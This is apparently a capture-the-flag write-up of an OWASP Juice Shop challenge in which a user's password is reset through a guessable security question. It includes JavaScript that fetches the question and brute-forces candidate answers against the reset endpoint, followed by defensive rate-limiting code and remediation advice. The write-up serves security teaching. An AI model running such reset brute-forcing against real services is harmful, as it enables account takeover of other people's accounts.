## Documentation

---

### **Methodology**

1. **Reconnaissance**
   - Identified the challenge as resetting Uvogin's password via the Forgot Password mechanism using the original answer to his security question.

2. **Security Question Retrieval**
   - Queried the security question endpoint to retrieve Uvogin's question:
     ```js
     fetch('/rest/user/security-question?email=uvogin@juice-sh.op')
       .then(r => r.json()).then(console.log)
     // Output: "Your favorite movie?"
     ```

3. **OSINT — Identifying the Answer**
   - Uvogin is a character from the manga/anime **Hunter x Hunter**.
   - Noticed that Uvogin's product reviews on the platform are written in leet speak (e.g., `y0ur f1r3wall needs m0r3 musc13`), suggesting his online presence uses leet speak variations of his name.
   - Searched fan wikis and online communities for Uvogin's character profile, which led to his favorite movie: **"Silence of the Lambs"**.

4. **Answer Testing**
   - Tested several candidate movie titles programmatically since the exact phrasing was uncertain:
     ```js
     const answers = ['Armageddon', 'Silence of the Lambs', 'The Silence of the Lambs', 'Gladiator', 'Braveheart', 'The Matrix']
     for (const answer of answers) {
       const r = await fetch('/rest/user/reset-password', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           email: 'uvogin@juice-sh.op',
           answer: answer,
           new: 'test1234',
           repeat: 'test1234'
         })
       })
       console.log(answer, r.status)
     }
     // Output: "Silence of the Lambs" 200
     ```

5. **Validation**
   - The password reset succeeded with the answer `Silence of the Lambs` and the challenge was marked as solved.

6. **Tools Used**
   - **Browser DevTools** (console)
   - **OSINT** (Hunter x Hunter wiki and fan community research)
   - **JavaScript `fetch` API** (for programmatic answer testing)

---
### **Vulnerabilities**

1. **Vulnerability Name**
   - **Weak Security Question / Knowledge-Based Authentication** (CWE-640) and **Absence of Rate Limiting on Password Reset** (CWE-307)

2. **Affected Components**
   - **Forgot Password Mechanism** (`POST /rest/user/reset-password`) and **Security Question System**

3. **Severity Level**
   - **Medium**
     - The security question answer is discoverable via OSINT, and the absence of rate limiting allows automated testing of candidate answers without any restriction.
     - The combination makes even moderately complex answers trivially brute-forceable.

---
### **Risks**

1. **Business Impact**
   - **Account Takeover**: An attacker who identifies the security question answer through OSINT or automated testing can reset the password and gain full account access.
   - **Data Breach**: A compromised account exposes personal data, order history, and payment information.
   - **Automated Exploitation**: The absence of rate limiting on the reset endpoint allows thousands of candidate answers to be tested in seconds, removing any practical security barrier.
   - **Reputational Damage**: Account takeover via a bypassable recovery mechanism severely damages user trust in the platform.

2. **Exploitation Potential**
   - No elevated privileges are required — any unauthenticated user can attempt to reset any account's password.
   - The lack of rate limiting makes brute force attacks trivial and undetectable without dedicated monitoring.

---
### **Actions**

#### **Risk Mitigation Strategies**
- Replace knowledge-based security questions with a tokenized email reset link that expires after 15-30 minutes.
- Implement strict rate limiting on the password reset endpoint — no more than 3-5 attempts per email address per hour.
- Add account lockout after repeated failed password reset attempts.
- If security questions must be retained, reject questions whose answers are publicly discoverable (e.g., favorite movie, pet name, hometown).

#### **Remediation Fixes**
- Implement a time-limited, single-use reset token sent to the user's registered email address instead of security questions.
- Add rate limiting middleware to `/rest/user/reset-password`:
  ```js
  const rateLimit = require('express-rate-limit')
  const resetLimiter = rateLimit({
    windowMs: 60 * 60 * 1000,
    max: 5,
    message: 'Too many reset attempts, please try again later.'
  })
  app.post('/rest/user/reset-password', resetLimiter, resetPasswordHandler)
  ```
- Log all password reset attempts with timestamps and IP addresses for audit purposes.

#### **Best Security Practices**
- NIST SP 800-63B explicitly discourages knowledge-based authentication for account recovery due to the ease of OSINT-based attacks and social engineering.
- Never allow automated brute forcing of security answers — rate limiting and lockout mechanisms are essential.
- Prefer Multi-Factor Authentication (MFA) or cryptographic reset tokens over security questions for all account recovery flows.
- **Reference**: [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
